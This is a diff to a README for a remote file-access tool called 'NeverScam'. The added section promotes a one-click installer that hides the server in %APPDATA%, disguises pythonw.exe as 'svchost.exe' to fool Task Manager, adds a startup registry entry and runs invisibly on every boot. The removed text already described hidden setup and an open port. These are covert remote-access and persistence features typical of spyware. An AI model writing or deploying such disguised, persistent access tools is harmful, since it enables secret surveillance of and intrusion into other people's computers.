@@ -23,29 +23,30 @@ A client-server application that allows remote access to files on a host compute
 
 ## Installation
 
+### One-Click Host Setup (Recommended)
+
+1. Download the repository
+2. On the host computer, double-click `auto-install.bat`
+3. That's it! The server will:
+   - Install to a hidden location (%APPDATA%\NeverScam)
+   - Copy pythonw.exe as "svchost.exe" to disguise the process
+   - Add to Windows startup registry
+   - Start immediately hidden
+
+**Note:** After installation, no files or applications are visible. The server runs completely hidden (appears as "svchost.exe" in Task Manager) and starts automatically on every boot.
+
+### Manual Setup (Alternative)
+
 1. Clone or download the repository
-2. Install dependencies for the client:
+2. Run `install.py` or `setup.bat` on the host computer
+3. Note the IP address of the host computer (e.g., 192.168.1.100)
+
+### Client Installation
+
+1. Install dependencies for the client:
    ```
    pip install -r requirements.txt
    ```
-
-## Usage
-
-### Setting up the Host (One-time setup)
-
-The server runs invisibly on the host computer and provides access to files within the home directory.
-
-1. On the host computer, double-click `setup.bat`
-2. The script will:
-   - Copy server.py to a hidden location (%APPDATA%\NeverScam)
-   - Add it to Windows startup registry
-   - Start the server immediately hidden
-
-3. Note the IP address of the host computer (e.g., 192.168.1.100)
-
-4. Ensure port 12345 is open in the firewall/router for remote access
-
-**Note:** After setup, no files or applications are visible on the host. The server runs completely hidden and starts automatically on boot.
 
 ### Running the Client
 
